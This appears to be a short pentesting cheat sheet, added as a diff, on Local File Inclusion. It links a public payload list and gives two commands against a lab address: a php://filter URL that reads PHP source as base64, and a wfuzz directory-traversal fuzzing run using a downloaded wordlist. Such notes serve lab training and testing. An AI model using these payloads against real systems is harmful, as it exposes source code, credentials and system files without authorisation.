@@ -1,0 +1,23 @@
+[-]======================================[-]
+    Local File Inclusion
+[-]======================================[-]
+
+- ---] References
+======================
+# RFI / LFI payloads
+https://github.com/payloadbox/rfi-lfi-payload-list
+
+
+
+
+- ---] Quick Commands
+======================
+
+# Read PHP files (Encoding needed)
+http://10.11.1.35/section.php?page=php://filter/convert.base64-encode/resource=section.php
+
+
+# Fuzz for Local files with Wfuzz
+wget https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt
+wfuzz -c -w list.txt --hw 0 http://10.11.1.35/section.php?page=../../../../../../../FUZZ
+
